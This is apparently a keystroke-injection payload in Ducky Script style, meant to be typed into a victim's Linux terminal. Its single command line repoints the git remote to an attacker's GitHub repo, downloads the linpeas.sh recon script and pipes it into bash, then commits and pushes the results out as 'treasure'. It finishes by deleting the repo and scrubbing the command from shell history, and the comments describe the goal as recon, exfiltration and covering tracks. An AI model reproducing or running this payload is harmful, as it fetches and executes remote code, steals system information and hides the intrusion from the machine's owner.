REM check current git remote setting, back it up, set it to your repo, then clone it and cd to it, then launch recon and exfil then cover your tracks, delete repo/files and history. I can't figure out how to restore the git remote url from the back up and this is as far as I got.
STRING git remote get-url --push origin > git.txt && git remote set-url origin https://"token"@github.com/"username"/"repoName".git && git clone "repo link" && cd "repo name" && nohup curl -s -L https://github.com/carlospolop/PEASS-ng/releases/download/20220703/linpeas.sh | bash >treasure.txt && git add * && git commit -m "treasure waits" && git push && cd .. && rm -rf "repo name" && history | grep history && line=$(history | grep history | awk '{ print $1 }') && history -d $line && set -o history
REM i'm sure there's a better way to do that

REM close the terminal and wait for treaure to arrive.
